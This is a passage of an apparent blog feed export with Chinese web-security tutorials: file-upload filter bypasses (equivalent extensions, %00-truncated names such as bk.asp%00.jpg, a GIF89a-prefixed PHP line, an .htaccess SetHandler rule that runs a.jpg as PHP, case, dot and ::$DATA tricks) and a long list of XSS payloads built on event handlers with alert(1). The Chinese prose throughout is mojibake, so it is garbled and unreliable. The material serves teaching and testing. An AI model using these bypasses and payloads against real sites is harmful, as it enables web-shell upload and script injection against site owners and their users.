ä¿®æ”¹ä¸ºå¦‚ï¼š<code>Content-Typeï¼šimage/gif</code> å’Œ <code>image/jpeg</code> ç­‰è¿è¡Œçš„æ–‡ä»¶ç±»å‹</p><p><strong>ç­‰ä»·æ‰©å±•åç»•è¿‡</strong></p><div class="table-container"><table><thead><tr><th>æ–‡ä»¶æ‹“å±•å</th><th>ç­‰ä»·æ‹“å±•å</th></tr></thead><tbody><tr><td>.php</td><td>.php2, .php3, .php4, .php5, .phps, .phtml</td></tr><tr><td>.asp</td><td>.aspx, .asa, .cer, .cdx</td></tr><tr><td>.asp</td><td>.aspq, .asmx, .ascx, ashx, .asax,</td></tr><tr><td>.jsp</td><td>.jspx, .jsw, .jspf, .jspa, .jhtml</td></tr><tr><td>.html</td><td>.htm</td></tr><tr><td>.zip</td><td>.jar, .war, .ear</td></tr><tr><td>.rar</td><td>.cbr</td></tr><tr><td>.png</td><td>.apng</td></tr><tr><td>.jpeg</td><td>.jpg, .jpe</td></tr><tr><td>.gif</td><td>.giff, .gfa</td></tr></tbody></table></div><h2 id="ç™½åå•ç»•è¿‡"><a href="#ç™½åå•ç»•è¿‡" class="headerlink" title="ç™½åå•ç»•è¿‡"></a>ç™½åå•ç»•è¿‡</h2><p><strong>ï¼ˆ1ï¼‰é…åˆwebå®¹å™¨çš„è§£ææ¼æ´ï¼š</strong></p><p>IISä¸­çš„ç›®å½•è§£ææ¼æ´å’Œåˆ†å·è§£ææ¼æ´ ï¼š</p><p>å°†ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶å<code>backlion.php</code>ï¼Œæ”¹æˆ <code>backlion.php.abc</code>(å¥‡æ€ªçš„ä¸è¢«è§£æçš„åç¼€åéƒ½è¡Œ)ã€‚é¦–å…ˆï¼Œ æœåŠ¡å™¨éªŒè¯æ–‡ä»¶æ‰©å±•åçš„æ—¶å€™ï¼ŒéªŒè¯çš„æ˜¯<code>.abc</code>ï¼Œåªè¦è¯¥æ‰©å±•åç¬¦åˆæœåŠ¡å™¨ç«¯é»‘ç™½åå•è§„åˆ™ï¼Œå³å¯ä¸Šä¼ </p><p>nginx ç©ºå­—èŠ‚æ¼æ´ <code>xxx.jpg%00.php</code> è¿™æ ·çš„æ–‡ä»¶åä¼šè¢«è§£æä¸ºphpä»£ç è¿è¡Œã€‚</p><p>apache çš„è§£ææ¼æ´ï¼Œä¸Šä¼ å¦‚ <code>a.php.rar a.php.gif</code> ç±»å‹çš„æ–‡ä»¶åï¼Œå¯ä»¥é¿å… å¯¹äºphpæ–‡ä»¶çš„è¿‡æ»¤æœºåˆ¶ï¼Œä½†æ˜¯ç”±äº apache åœ¨è§£ææ–‡ä»¶åçš„æ—¶å€™æ˜¯ä»å³å‘å·¦è¯»ï¼Œå¦‚æœé‡åˆ°ä¸èƒ½è¯†åˆ«çš„æ‰©å±•ååˆ™è·³è¿‡ï¼Œrar ç­‰æ‰©å±•åæ˜¯ apache ä¸èƒ½è¯†åˆ«çš„ï¼Œ å› æ­¤å°±ä¼šç›´æ¥å°†ç±»å‹è¯†åˆ«ä¸º phpï¼Œä»è€Œè¾¾åˆ°äº†æ³¨å…¥phpä»£ç çš„ç›®çš„</p><p><strong>ï¼ˆ2ï¼‰%00 æˆªæ–­ä¸Šä¼ ç»•è¿‡</strong></p><p>é€šè¿‡æŠ“åŒ…æˆªæ–­å°† <strong>backlion.asp.jpg</strong> åé¢çš„ä¸€ä¸ª<strong>.</strong>æ¢æˆ<strong>%00</strong> åœ¨ä¸Šä¼ çš„æ—¶å€™å³ <strong>backlion.asp%00.jpg</strong>ï¼Œå½“æ–‡ä»¶ç³»ç»Ÿè¯»åˆ°<strong>%00</strong> æ—¶ï¼Œä¼šè®¤ä¸ºæ–‡ä»¶å·²ç»ç»“æŸï¼Œä»è€Œå°† <strong>backlion.asp.jpg</strong> çš„å†…å®¹å†™å…¥åˆ° <strong>backlion.asp</strong> ä¸­ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚<strong>%00</strong> ä¸æ˜¯é’ˆå¯¹æ‰€æœ‰åŸºäºç™½åå•çš„åç¼€åæ£€æŸ¥éƒ½èƒ½ç»•è¿‡ï¼Œä»£ç çš„å®ç°è¿‡ç¨‹ä¸­å¿…é¡»å­˜åœ¨æˆª æ–­ä¸Šä¼ æ¼æ´ï¼Œä¸Šä¼ æ ¼å¼å¦‚ä¸‹ï¼š<strong>bk.asp%00.jpg</strong></p><p><strong>ï¼ˆ3ï¼‰æ–‡ä»¶å¤´å†…å®¹æ£€æµ‹ç»•è¿‡</strong></p><p>æ–‡ä»¶å¤´ç®€ä»‹</p><p>ä¸åŒçš„å›¾ç‰‡æ–‡ä»¶éƒ½æœ‰ä¸åŒæ–‡ä»¶å¤´ï¼Œå¦‚ï¼š PNGï¼šæ–‡ä»¶å¤´æ ‡è¯† (8 bytes) 89 50 4E 47 0D 0A 1A 0A JPEGï¼š æ–‡ä»¶å¤´æ ‡è¯† (2 bytes): 0xff, 0xd8 (SOI) (JPEG æ–‡ä»¶æ ‡è¯†) GIFï¼šæ–‡ä»¶å¤´æ ‡è¯† (6 bytes) 47 49 46 38 39(37) 61 ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ä¼šæ£€æŸ¥ä¸Šä¼ æ–‡ä»¶æ˜¯å¦åˆæ³•ï¼Œå¦‚å›¾ç‰‡æ–‡ä»¶æ˜¯å¦æ–‡ä»¶å¤´å«æœ‰ gif89, è¿™é‡Œå¯ä»¥é€šè¿‡ä¸€å¥è¯å›¾ç‰‡æœ¨é©¬ç”Ÿæˆå·¥å…· edjpgcom æˆ’è€…é€šè¿‡ç¼–è¾‘å™¨åœ¨æœ¨é©¬å†…å®¹åŸºç¡€ä¸Šå†åŠ äº†ä¸€äº›æ–‡ä»¶ä¿¡æ¯ï¼Œæœ‰ç‚¹åƒä¸‹é¢çš„ç»“æ„:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a <span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="htaccessç»•è¿‡"><a href="#htaccessç»•è¿‡" class="headerlink" title=".htaccessç»•è¿‡"></a>.htaccessç»•è¿‡</h2><p>Hypertext Access(è¶…æ–‡æœ¬å…¥å£)</p><p><code>.htaccess</code> æ–‡ä»¶æ˜¯ Apache æœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®</p><p>é€šè¿‡ .htaccess æ–‡ä»¶ï¼Œå¯ä»¥å®ç°ï¼šç½‘é¡µ 301 é‡å®šå‘ã€è‡ªå®šä¹‰404 é”™è¯¯é¡µé¢ã€<strong>æ”¹å˜æ–‡ä»¶æ‰©å±•å</strong>ã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½,ç½‘é¡µä¼ªé™æ€ï¼ˆåŸæ¥æ˜¯å‚æ•°è¯·æ±‚çš„åŠ¨æ€å½¢å¼æ”¹ä¸ºhtmlçš„ä¼ªé™æ€å½¢å¼ï¼‰å°±æ˜¯ç”¨è¿™ä¸ªå®ç°çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;a.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php   <span class="comment">//MIMEç±»å‹</span></span><br><span class="line">&lt;/FilesMatch&gt;     <span class="comment">//å°†a.jpgå½“ä½œphpæ–‡ä»¶å¤„ç†</span></span><br></pre></td></tr></table></figure><p>æŠŠ.htaccessä¸Šä¼ ä¸Šå»ï¼Œå†ä¸Šä¼ å°±å¯æˆåŠŸ</p><ul><li><p>å¤§å°å†™ç»•è¿‡</p><p> <code>shell.PHP</code></p></li><li><p>ç©ºæ ¼ç»•è¿‡</p><p>windowsä¼šè‡ªåŠ¨å»æ‰åç¼€ä¸­çš„ç©ºæ ¼ï¼Œä½ç‰ˆæœ¬phpï¼ŒæŠ“åŒ…æ”¹åŒ…åç¼€æœ€ååŠ ç©ºæ ¼ã€‚</p></li><li><p>ç‚¹ç»•è¿‡</p><p>windowsä¼šè‡ªåŠ¨å»æ‰åç¼€ä¸­çš„ç‚¹å¦‚1.php.ä¼šè§£æä¸º1.phpï¼Œæˆ‘ä»¬å¯ä»¥æŠ“åŒ…ååŠ åœ¨åç¼€ä¸­åŠ ç‚¹ä¸Šä¼ </p></li><li><p>::$DATAç»•è¿‡</p><p>æŠ“åŒ…ï¼Œåœ¨filenameåæ·»åŠ ::$DATAï¼Œä¸ä¸Šè¿°åŸç†ä¸€æ ·</p></li><li><p>ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡</p><p>æŠ“åŒ…ï¼Œåœ¨filenameåæ·»åŠ . .</p></li><li><p>åŒå†™ç»•è¿‡</p><p>ç”¨äºé»‘åå•æ›¿æ¢æ–‡ä»¶åä¸ºç©ºï¼Œshell.pphphpå˜ä¸ºshell.php</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2023/07/26/XSS/"/>
      <url>/2023/07/26/XSS/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="XSSæ¦‚è¿°"><a href="#XSSæ¦‚è¿°" class="headerlink" title="XSSæ¦‚è¿°"></a>XSSæ¦‚è¿°</h1><h2 id="XSS-æ¼æ´ç®€ä»‹"><a href="#XSS-æ¼æ´ç®€ä»‹" class="headerlink" title="XSS æ¼æ´ç®€ä»‹"></a>XSS æ¼æ´ç®€ä»‹</h2><p> XSSåˆå«CSSï¼ˆCross Site Scriptï¼‰è·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æŒ‡æ¶æ„æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚</p><p> xssæ¼æ´é€šå¸¸æ˜¯é€šè¿‡phpçš„è¾“å‡ºå‡½æ•°å°†javascriptä»£ç è¾“å‡ºåˆ°htmlé¡µé¢ä¸­ï¼Œé€šè¿‡ç”¨æˆ·æœ¬åœ°æµè§ˆå™¨æ‰§è¡Œçš„ï¼Œæ‰€ä»¥xssæ¼æ´å…³é”®å°±æ˜¯å¯»æ‰¾å‚æ•°æœªè¿‡æ»¤çš„è¾“å‡ºå‡½æ•°ã€‚<br>å¸¸è§çš„è¾“å‡ºå‡½æ•°æœ‰ï¼š <code>echo printf print print_r sprintf die var-dump var_export</code></p><h2 id="XSSçš„åŸç†"><a href="#XSSçš„åŸç†" class="headerlink" title="XSSçš„åŸç†"></a>XSSçš„åŸç†</h2><ul><li>æ”»å‡»è€…å¯¹å«æœ‰æ¼æ´çš„æœåŠ¡å™¨å‘èµ·XSSæ”»å‡»ï¼ˆæ³¨å…¥JSä»£ç ï¼‰ã€‚</li><li>è¯±ä½¿å—å®³è€…æ‰“å¼€å—åˆ°æ”»å‡»çš„æœåŠ¡å™¨URLã€‚</li><li>å—å®³è€…åœ¨Webæµè§ˆå™¨ä¸­æ‰“å¼€URLï¼Œæ¶æ„è„šæœ¬æ‰§è¡Œã€‚</li></ul><h2 id="XSSçš„æ”»å‡»æ–¹å¼"><a href="#XSSçš„æ”»å‡»æ–¹å¼" class="headerlink" title="XSSçš„æ”»å‡»æ–¹å¼"></a>XSSçš„æ”»å‡»æ–¹å¼</h2><ul><li><strong>åå°„å‹XSS</strong>ï¼š&lt;éæŒä¹…åŒ–&gt; æ”»å‡»è€…äº‹å…ˆåˆ¶ä½œå¥½æ”»å‡»é“¾æ¥, éœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢ã€‚ä¸€èˆ¬æ˜¯åç«¯ä»£ç è¿›è¡Œå¤„ç†</li><li><strong>å­˜å‚¨å‹XSS</strong>ï¼š&lt;æŒä¹…åŒ–&gt; ä»£ç æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨æ•°æ®åº“ä¸­çš„ï¼Œå¦‚åœ¨ä¸ªäººä¿¡æ¯æˆ–å‘è¡¨æ–‡ç« ç­‰åœ°æ–¹ï¼ŒåŠ å…¥ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œé‚£ä¹ˆè¿™äº›ä»£ç å°†å‚¨å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œæ¯å½“æœ‰ç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™éƒ½ä¼šè§¦å‘ä»£ç æ‰§è¡Œï¼Œè¿™ç§XSSéå¸¸å±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œå¤§é‡ç›—çªƒcookieï¼ˆè™½ç„¶è¿˜æœ‰ç§DOMå‹XSSï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯åŒ…æ‹¬åœ¨å­˜å‚¨å‹XSSå†…ï¼‰</li><li><strong>DOMå‹XSS</strong>ï¼šåŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹Document Objeet Modelï¼ŒDOM)çš„ä¸€ç§æ¼æ´ã€‚DOMæ˜¯ä¸€ä¸ªä¸å¹³å°ã€ç¼–ç¨‹è¯­è¨€æ— å…³çš„æ¥å£ï¼Œå®ƒå…è®¸ç¨‹åºæˆ–è„šæœ¬åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£å†…å®¹ã€ç»“æ„å’Œæ ·å¼ï¼Œå¤„ç†åçš„ç»“æœèƒ½å¤Ÿæˆä¸ºæ˜¾ç¤ºé¡µé¢çš„ä¸€éƒ¨åˆ†ã€‚DOMä¸­æœ‰å¾ˆå¤šå¯¹è±¡ï¼Œå…¶ä¸­ä¸€äº›æ˜¯ç”¨æˆ·å¯ä»¥æ“çºµçš„ï¼Œå¦‚uRI ï¼Œlocationï¼ŒrefelTerç­‰ã€‚å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡DOMåŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºæäº¤æ•°æ®åˆ°æœåŠ¡å™¨ç«¯ï¼Œè€Œä»å®¢æˆ·ç«¯è·å¾—DOMä¸­çš„æ•°æ®åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå¦‚æœDOMä¸­çš„æ•°æ®æ²¡æœ‰ç»è¿‡ä¸¥æ ¼ç¡®è®¤ï¼Œå°±ä¼šäº§ç”ŸDOM XSSæ¼æ´ã€‚ä¸€èˆ¬æ˜¯æµè§ˆå™¨å‰ç«¯ä»£ç è¿›è¡Œå¤„ç†</li></ul><h2 id="XSSçš„å±å®³"><a href="#XSSçš„å±å®³" class="headerlink" title="XSSçš„å±å®³"></a>XSSçš„å±å®³</h2><blockquote><p>1.æŒ‚é©¬<br>2.ç›—å–ç”¨æˆ·Cookieã€‚<br>3.DOSï¼ˆæ‹’ç»æœåŠ¡ï¼‰å®¢æˆ·ç«¯æµè§ˆå™¨ã€‚<br>4.é’“é±¼æ”»å‡»ï¼Œé«˜çº§çš„é’“é±¼æŠ€å·§ã€‚<br>5.åˆ é™¤ç›®æ ‡æ–‡ç« ã€æ¶æ„ç¯¡æ”¹æ•°æ®ã€å«ç¥¸ã€‚<br>6.åŠ«æŒç”¨æˆ·Webè¡Œä¸ºï¼Œç”šè‡³è¿›ä¸€æ­¥æ¸—é€å†…ç½‘ã€‚<br>7.çˆ†å‘Web2.0è •è™«ã€‚<br>8.è •è™«å¼çš„DDoSæ”»å‡»ã€‚<br>9.è •è™«å¼æŒ‚é©¬æ”»å‡»ã€åˆ·å¹¿å‘Šã€åˆ·æµé‡ã€ç ´åç½‘ä¸Šæ•°æ®<br>10.å…¶å®ƒå®‰å…¨é—®é¢˜</p></blockquote><h1 id="å¸¸è§XSSæ”»å‡»æ–¹å¼"><a href="#å¸¸è§XSSæ”»å‡»æ–¹å¼" class="headerlink" title="å¸¸è§XSSæ”»å‡»æ–¹å¼"></a>å¸¸è§XSSæ”»å‡»æ–¹å¼</h1><p><strong>scirpt æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; æ ‡ç­¾ç”¨äºå®šä¹‰å®¢æˆ·ç«¯è„šæœ¬ï¼Œæ¯”å¦‚ <span class="title class_">JavaScript</span>ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>img æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img&gt; æ ‡ç­¾å®šä¹‰ <span class="variable constant_">HTML</span> é¡µé¢ä¸­çš„å›¾åƒã€‚</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>input æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input&gt; æ ‡ç­¾è§„å®šäº†ç”¨æˆ·å¯ä»¥åœ¨å…¶ä¸­è¾“å…¥æ•°æ®çš„è¾“å…¥å­—æ®µã€‚</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onfocus äº‹ä»¶åœ¨å¯¹è±¡è·å¾—ç„¦ç‚¹æ—¶å‘ç”Ÿï¼š</span><br><span class="line">&lt;input onfocus=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p>ç«äº‰ç„¦ç‚¹ï¼Œä»è€Œè§¦å‘<code>onblur</code>äº‹ä»¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onblur=<span class="title function_">alert</span>(<span class="number">1</span>) autofocus&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><code>input</code> æ ‡ç­¾çš„ <code>autofocus</code> å±æ€§è§„å®šå½“é¡µé¢åŠ è½½æ—¶ å…ƒç´ åº”è¯¥è‡ªåŠ¨è·å¾—ç„¦ç‚¹ã€‚å¯ä»¥é€šè¿‡<code>autofocus</code>å±æ€§è‡ªåŠ¨æ‰§è¡Œæœ¬èº«çš„<code>focus</code>äº‹ä»¶ï¼Œè¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Šï¼Œè§¦å‘ç„¦ç‚¹äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=<span class="string">&quot;alert(1);&quot;</span> autofocus&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; Î¿nclick=alert(1)&gt;        è¿™æ ·éœ€è¦ç‚¹å‡»ä¸€ä¸‹è¾“å…¥æ¡†&lt;br&gt;</span></span><br><span class="line"><span class="string">&quot;</span> onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;    éœ€è¦é¼ æ ‡åˆ’è¿‡è¾“å…¥æ¡†&lt;br&gt;</span><br></pre></td></tr></table></figure><p><strong>details æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;details&gt; æ ‡ç­¾é€šè¿‡æä¾›ç”¨æˆ·å¼€å¯å…³é—­çš„äº¤äº’å¼æ§ä»¶ï¼Œè§„å®šäº†ç”¨æˆ·å¯è§çš„æˆ–è€…éšè—çš„éœ€æ±‚çš„è¡¥å……ç»†èŠ‚ã€‚ontoggle äº‹ä»¶è§„å®šäº†åœ¨ç”¨æˆ·æ‰“å¼€æˆ–å…³é—­ &lt;details&gt; å…ƒç´ æ—¶è§¦å‘ï¼š</span><br><span class="line"></span><br><span class="line">&lt;details ontoggle=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>details</code> æ ‡ç­¾çš„ <code>open</code> å±æ€§è§¦å‘<code>ontoggle</code>äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»ç‚¹å‡»å³å¯è§¦å‘ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p><strong>svg æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt; æ ‡ç­¾ç”¨æ¥åœ¨<span class="variable constant_">HTML</span>é¡µé¢ä¸­ç›´æ¥åµŒå…¥<span class="variable constant_">SVG</span> æ–‡ä»¶çš„ä»£ç ã€‚</span><br><span class="line">&lt;svg onload=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p><strong>select æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select&gt; æ ‡ç­¾ç”¨æ¥åˆ›å»ºä¸‹æ‹‰åˆ—è¡¨ã€‚</span><br><span class="line">&lt;select onfocus=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;&lt;/select</span><br><span class="line"></span><br><span class="line">é€šè¿‡autofocuså±æ€§è§„å®šå½“é¡µé¢åŠ è½½æ—¶å…ƒç´ åº”è¯¥è‡ªåŠ¨è·å¾—ç„¦ç‚¹ï¼Œè¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Šï¼Œè§¦å‘ç„¦ç‚¹äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘ï¼š</span><br><span class="line">&lt;select onfocus=<span class="title function_">alert</span>(<span class="number">1</span>) autofocus&gt;</span><br></pre></td></tr></table></figure><p><strong>iframe æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe&gt; æ ‡ç­¾ä¼šåˆ›å»ºåŒ…å«å¦å¤–ä¸€ä¸ªæ–‡æ¡£çš„å†…è”æ¡†æ¶ã€‚</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><strong>video æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt; æ ‡ç­¾å®šä¹‰è§†é¢‘ï¼Œæ¯”å¦‚ç”µå½±ç‰‡æ®µæˆ–å…¶ä»–è§†é¢‘æµã€‚</span><br><span class="line"></span><br><span class="line">&lt;video&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>audio æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio&gt; æ ‡ç­¾å®šä¹‰å£°éŸ³ï¼Œæ¯”å¦‚éŸ³ä¹æˆ–å…¶ä»–éŸ³é¢‘æµã€‚</span><br><span class="line"></span><br><span class="line">&lt;audio src=x  onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p><strong>body æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt; æ ‡ç­¾å®šä¹‰æ–‡æ¡£çš„ä¸»ä½“ã€‚</span><br><span class="line"></span><br><span class="line">&lt;body onload=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p>onscroll äº‹ä»¶åœ¨å…ƒç´ æ»šåŠ¨æ¡åœ¨æ»šåŠ¨æ—¶è§¦å‘ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¢è¡Œç¬¦ä»¥åŠautofocusï¼Œå½“ç”¨æˆ·æ»‘åŠ¨æ»šåŠ¨æ¡çš„æ—¶å€™è‡ªåŠ¨è§¦å‘ï¼Œæ— éœ€ç”¨æˆ·å»ç‚¹å‡»è§¦å‘ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body</span><br><span class="line">onscroll=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>textarea æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt; æ ‡ç­¾å®šä¹‰ä¸€ä¸ªå¤šè¡Œçš„æ–‡æœ¬è¾“å…¥æ§ä»¶ã€‚</span><br><span class="line"></span><br><span class="line">&lt;textarea onfocus=<span class="title function_">alert</span>(<span class="number">1</span>); autofocus&gt;</span><br></pre></td></tr></table></figure><p><strong>keygen æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=<span class="title function_">alert</span>(<span class="number">1</span>)&gt; <span class="comment">//ä»…é™ç«ç‹</span></span><br></pre></td></tr></table></figure><p><strong>marquee æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=<span class="title function_">alert</span>(<span 